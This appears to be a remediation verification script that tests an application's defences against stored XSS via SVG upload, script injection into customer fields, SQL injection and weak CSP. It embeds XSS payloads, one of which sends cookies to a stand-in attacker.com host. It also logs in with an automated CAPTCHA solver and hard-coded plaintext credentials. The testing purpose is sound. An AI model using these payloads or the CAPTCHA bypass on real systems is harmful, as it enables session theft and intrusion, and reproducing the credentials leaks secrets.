/**
 * OWASP A05:2025 - Injection Verification Suite
 *
 * Verifies live remediations for:
 * 1. Finding 11 (Alert 5588639, CVSS 8.7 High, CWE-79):
 *    Cross-Site Scripting (XSS) via Malicious SVG Upload on /api/customers/{id}/feedback-image/{slot}
 * 2. Finding 8 (Alert 5589176, CVSS 3.1 Low, CWE-74):
 *    User Input With Special Characters & Injection on feedback and customer data fields
 * 3. Content Security Policy (CSP) & Defense-in-Depth against Script Execution
 */

const TARGET_HOST = 'titan.xylozentech.com';
const BASE_URL = `https://${TARGET_HOST}`;

interface CaptchaResponse {
  captchaId: string;
  captchaSvg: string;
}

interface LoginResponse {
  error?: string;
  user?: {
    email: string;
    name: string;
    role: string;
    storeName?: string | null;
  };
}

async function solveCaptchaAndLogin(email: string, pass: string): Promise<string> {
  const captchaRes = await fetch(`${BASE_URL}/api/auth/captcha`);
  if (!captchaRes.ok) {
    throw new Error(`Failed to fetch CAPTCHA: ${captchaRes.status}`);
  }

  const { captchaId, captchaSvg } = (await captchaRes.json()) as CaptchaResponse;
  const decodedSvg = decodeURIComponent(captchaSvg.replace('data:image/svg+xml;utf8,', ''));
  const captchaSolution = [...decodedSvg.matchAll(/>([A-Za-z0-9])<\/text>/g)]
    .map((m) => m[1])
    .join('');

  const loginRes = await fetch(`${BASE_URL}/api/login`, {
    body: JSON.stringify({
      captchaId,
      captchaSolution,
      email,
      password: pass,
    }),
    headers: { 'Content-Type': 'application/json' },
    method: 'POST',
  });

  if (!loginRes.ok) {
    const errBody = await loginRes.text();
    throw new Error(`Login failed (${loginRes.status}): ${errBody}`);
  }

  const setCookie = loginRes.headers.get('set-cookie');
  if (!setCookie) {
    throw new Error('No Set-Cookie header returned upon login');
  }

  return setCookie.split(';')[0];
}

async function ensureTestCustomerExists(cookie: string): Promise<string> {
  const listRes = await fetch(`${BASE_URL}/api/customers`, {
    headers: { Cookie: cookie },
  });

  if (listRes.ok) {
    const list = (await listRes.json()) as Array<{ id: string; name: string }>;
    if (Array.isArray(list) && list.length > 0) {
      return list[0].id;
    }
  }

  // Create customer #0001 if none exists
  const createRes = await fetch(`${BASE_URL}/api/customers`, {
    body: JSON.stringify({
      age: 28,
      customerType: 'New',
      gender: 'Male',
      mobile: '9876543210',
      name: 'Verification Patient',
      preferredLanguage: 'English',
      status: 'Created',
      storeName: 'STRA',
    }),
    headers: {
      'Content-Type': 'application/json',
      Cookie: cookie,
    },
    method: 'POST',
  });

  const created = (await createRes.json()) as { id: string };
  return created.id;
}

async function runA05Verification() {
  console.log('================================================================');
  console.log('       OWASP A05:2025 - Injection Verification Suite            ');
  console.log(`  Target Host: ${BASE_URL}                                     `);
  console.log('================================================================\n');

  let allPassed = true;

  try {
    console.log('[*] Authenticating with store user credentials...');
    const storeCookie = await solveCaptchaAndLogin(
      'store-a@thebytebandits.onmicrosoft.com',
      'TitanRemote@2026!#'
    );
    console.log('  ✅ [PASS] Successfully authenticated with store user session.');

    const customerId = await ensureTestCustomerExists(storeCookie);
    const encodedCustId = encodeURIComponent(customerId);
    console.log(`  ℹ️  Using test customer ID: ${customerId}\n`);

    // -------------------------------------------------------------
    // PART 1: Finding 11 - Stored XSS via SVG Upload (CWE-79)
    // -------------------------------------------------------------
    console.log('--- TEST 1: Stored XSS via Malicious SVG Upload (Finding 11 - CVSS 8.7 High) ---');

    // Test 1.1: Direct SVG file upload
    console.log('  [1.1] Testing direct SVG upload containing active JavaScript payload...');
    const maliciousSvgContent =
      '<?xml version="1.0" encoding="UTF-8"?>\n' +
      '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n' +
      '  <script type="text/javascript">\n' +
      '    alert("XSS Vulnerability: " + document.domain);\n' +
      '  </script>\n' +
      '  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />\n' +
      '</svg>';

    const svgBlob = new Blob([maliciousSvgContent], { type: 'image/svg+xml' });
    const svgForm = new FormData();
    svgForm.append('image', svgBlob, 'malicious_exploit.svg');

    const svgUploadRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      body: svgForm,
      headers: { Cookie: storeCookie },
      method: 'POST',
    });

    if (svgUploadRes.status === 400) {
      const err = await svgUploadRes.json();
      console.log(`  ✅ [PASS] Direct SVG upload blocked with HTTP 400: "${err.error}"`);
    } else {
      console.error(`  ❌ Direct SVG upload was NOT blocked! Status: ${svgUploadRes.status}`);
      allPassed = false;
    }

    // Test 1.2: Extension and MIME Spoofing (SVG renamed to .png)
    console.log('  [1.2] Testing extension/MIME spoofed SVG upload (exploit.png with SVG content)...');
    const spoofedForm = new FormData();
    spoofedForm.append('image', new Blob([maliciousSvgContent], { type: 'image/png' }), 'exploit.png');

    const spoofedUploadRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      body: spoofedForm,
      headers: { Cookie: storeCookie },
      method: 'POST',
    });

    if (spoofedUploadRes.status === 400) {
      const err = await spoofedUploadRes.json();
      console.log(`  ✅ [PASS] Spoofed SVG-as-PNG blocked with HTTP 400: "${err.error}"`);
    } else {
      console.error(`  ❌ Spoofed SVG-as-PNG upload was NOT blocked! Status: ${spoofedUploadRes.status}`);
      allPassed = false;
    }

    // Test 1.3: SVG with Event Handler (<svg onload=alert(1)>)
    console.log('  [1.3] Testing SVG payload with inline onload event handler...');
    const eventSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"></svg>';
    const eventForm = new FormData();
    eventForm.append('image', new Blob([eventSvg], { type: 'image/svg+xml' }), 'event.svg');

    const eventUploadRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      body: eventForm,
      headers: { Cookie: storeCookie },
      method: 'POST',
    });

    if (eventUploadRes.status === 400) {
      console.log('  ✅ [PASS] SVG with event handler strictly blocked with HTTP 400.');
    } else {
      console.error(`  ❌ SVG with event handler was NOT blocked! Status: ${eventUploadRes.status}`);
      allPassed = false;
    }

    // Test 1.4: Valid PNG Upload
    console.log('  [1.4] Testing upload of legitimate PNG image...');
    const validPngBytes = Buffer.from(
      '89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082',
      'hex'
    );
    const validForm = new FormData();
    validForm.append('image', new Blob([validPngBytes], { type: 'image/png' }), 'valid_test.png');

    const validUploadRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      body: validForm,
      headers: { Cookie: storeCookie },
      method: 'POST',
    });

    if (validUploadRes.status === 201) {
      console.log('  ✅ [PASS] Legitimate PNG image successfully uploaded with HTTP 201 Created.');
    } else {
      console.error(`  ❌ Valid PNG upload failed! Status: ${validUploadRes.status}`);
      allPassed = false;
    }

    // Test 1.5: Image Retrieval Defense-in-Depth Headers
    console.log('  [1.5] Verifying defense-in-depth security headers on feedback image retrieval...');
    const getImgRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      headers: { Cookie: storeCookie },
    });

    const csp = getImgRes.headers.get('content-security-policy');
    const xcto = getImgRes.headers.get('x-content-type-options');
    const corp = getImgRes.headers.get('cross-origin-resource-policy');
    const contentType = getImgRes.headers.get('content-type');

    if (
      getImgRes.status === 200 &&
      csp?.includes('sandbox') &&
      xcto === 'nosniff' &&
      corp === 'same-origin' &&
      contentType === 'image/png'
    ) {
      console.log(`  ✅ [PASS] Verified strict sandboxed CSP: "${csp}"`);
      console.log(`  ✅ [PASS] Verified X-Content-Type-Options: "${xcto}"`);
      console.log(`  ✅ [PASS] Verified Cross-Origin-Resource-Policy: "${corp}"`);
      console.log(`  ✅ [PASS] Verified detected authentic MIME: "${contentType}"`);
    } else {
      console.error('  ❌ Image retrieval headers did not meet strict security standards:', {
        corp,
        csp,
        status: getImgRes.status,
        xcto,
      });
      allPassed = false;
    }

    // Test 1.6: Cleanup
    console.log('  [1.6] Cleaning up test image...');
    const delRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}/feedback-image/1`, {
      headers: { Cookie: storeCookie },
      method: 'DELETE',
    });

    if (delRes.status === 200) {
      console.log('  ✅ [PASS] Test image deleted and reference cleared with HTTP 200.');
    } else {
      console.error(`  ❌ Failed to clean up test image! Status: ${delRes.status}`);
      allPassed = false;
    }

    // -------------------------------------------------------------
    // PART 2: Finding 8 - User Input With Special Characters (CWE-74)
    // -------------------------------------------------------------
    console.log('\n--- TEST 2: Special Characters & Input Sanitization (Finding 8 - CVSS 3.1 Low) ---');

    // Test 2.1: Prohibited <script> tag in Customer Name
    console.log('  [2.1] Testing script tag injection in customer name field...');
    const scriptNameRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}`, {
      body: JSON.stringify({
        age: 28,
        customerType: 'New',
        gender: 'Male',
        mobile: '9876543210',
        name: '<script>alert("XSS")</script>',
        preferredLanguage: 'English',
        status: 'Created',
      }),
      headers: {
        'Content-Type': 'application/json',
        Cookie: storeCookie,
      },
      method: 'PUT',
    });

    if (scriptNameRes.status === 400) {
      const err = await scriptNameRes.json();
      console.log(`  ✅ [PASS] Script in Name rejected with HTTP 400: ${JSON.stringify(err.details || err.error)}`);
    } else {
      console.error(`  ❌ Script injection in Name was NOT rejected! Status: ${scriptNameRes.status}`);
      allPassed = false;
    }

    // Test 2.2: Prohibited script tag in Store Feedback
    console.log('  [2.2] Testing HTML/script injection in store feedback field...');
    const scriptFeedbackRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}`, {
      body: JSON.stringify({
        age: 28,
        customerType: 'New',
        gender: 'Male',
        mobile: '9876543210',
        name: 'Valid Patient',
        preferredLanguage: 'English',
        status: 'Created',
        storeFeedback: '<script>document.location="https://attacker.com/steal?"+document.cookie</script>',
      }),
      headers: {
        'Content-Type': 'application/json',
        Cookie: storeCookie,
      },
      method: 'PUT',
    });

    if (scriptFeedbackRes.status === 400) {
      const err = await scriptFeedbackRes.json();
      console.log(`  ✅ [PASS] Script in Feedback rejected with HTTP 400: ${JSON.stringify(err.details || err.error)}`);
    } else {
      console.error(`  ❌ Script in Feedback was NOT rejected! Status: ${scriptFeedbackRes.status}`);
      allPassed = false;
    }

    // Test 2.3: Control character injection (\x00 null bytes and \x08)
    console.log('  [2.3] Testing dangerous control character handling in text fields...');
    const controlCharFeedback = 'Clinical observation\x00with null\x08bytes';
    const controlCharRes = await fetch(`${BASE_URL}/api/customers/${encodedCustId}`, {
      body: JSON.stringify({
        age: 28,
        customerType: 'New',
        gender: 'Male',
        mobile: '9876543210',
        name: 'Valid Patient',
        preferredLanguage: 'English',
        status: 'Created',
        storeFeedback: controlCharFeedback,
      }),
      headers: {
        'Content-Type': 'application/json',
        Cookie: storeCookie,
      },
      method: 'PUT',
    });

    if (controlCharRes.status === 200) {
      const updated = await controlCharRes.json();
      const sanitizedFb = updated.customer?.storeFeedback;
      if (!sanitizedFb.includes('\x00') && !sanitizedFb.includes('\x08')) {
        console.log(`  ✅ [PASS] Control characters stripped cleanly: "${sanitizedFb}"`);
      } else {
        console.error('  ❌ Control characters were preserved in output!');
        allPassed = false;
      }
    } else {
      console.error(`  ❌ Control character test request failed with status: ${controlCharRes.status}`);
      allPassed = false;
    }

    // Test 2.4: SQL Injection attempt in Customer ID parameter
    console.log('  [2.4] Testing SQL injection attack in customer ID URL route parameter...');
    const sqliIdRes = await fetch(`${BASE_URL}/api/customers/1'%20OR%20'1'='1`, {
      headers: { Cookie: storeCookie },
    });

    if (sqliIdRes.status === 400 || sqliIdRes.status === 404) {
      console.log(`  ✅ [PASS] SQL injection vector in customer ID safely blocked (${sqliIdRes.status}).`);
    } else {
      console.error(`  ❌ SQL injection attempt returned unexpected status: ${sqliIdRes.status}`);
      allPassed = false;
    }

    // Test 2.5: Special character & script injection in Image Slot parameter
    console.log('  [2.5] Testing special characters / script injection in image slot parameter...');
    const maliciousSlotRes = await fetch(
      `${BASE_URL}/api/customers/${encodedCustId}/feedback-image/slot%22%3E%3Cscript%3E`,
      { headers: { Cookie: storeCookie } }
    );

    if (maliciousSlotRes.status === 400) {
      const err = await maliciousSlotRes.json();
      console.log(`  ✅ [PASS] Malformed slot parameter rejected with HTTP 400: "${err.error}"`);
    } else {
      console.error(`  ❌ Malformed slot parameter was NOT rejected! Status: ${maliciousSlotRes.status}`);
      allPassed = false;
    }

    // -------------------------------------------------------------
    // PART 3: Global Defense - Content Security Policy (CSP)
    // -------------------------------------------------------------
    console.log('\n--- TEST 3: Global Content Security Policy (CSP Hardening) ---');
    const rootRes = await fetch(`${BASE_URL}/`);
    const rootCsp = rootRes.headers.get('content-security-policy') || '';

    console.log(`  ℹ️  Active Content Security Policy: ${rootCsp}`);

    const hasNoUnsafeInlineScript = !rootCsp.includes("script-src 'unsafe-inline'");
    const hasNoUnsafeEvalScript = !rootCsp.includes("script-src 'unsafe-eval'");
    const hasObjectSrcNone = rootCsp.includes("object-src 'none'");

    if (hasNoUnsafeInlineScript && hasNoUnsafeEvalScript && hasObjectSrcNone) {
      console.log("  ✅ [PASS] script-src strictly forbids 'unsafe-inline' and 'unsafe-eval'.");
      console.log("  ✅ [PASS] object-src is set to 'none' (blocks Flash/Java/malicious plugin injection).");
    } else {
      console.error('  ❌ CSP allows unsafe script execution directives!');
      allPassed = false;
    }
  } catch (err) {
    console.error('  ❌ Unhandled exception during A05 verification:', err);
    allPassed = false;
  }

  console.log('\n================================================================');
  if (allPassed) {
    console.log('   🎉 ALL OWASP A05:2025 INJECTION TESTS PASSED SUCCESSFULLY!   ');
  } else {
    console.log('   ❌ SOME INJECTION TESTS FAILED. Review output above.          ');
  }
  console.log('================================================================\n');

  process.exit(allPassed ? 0 : 1);
}

runA05Verification();
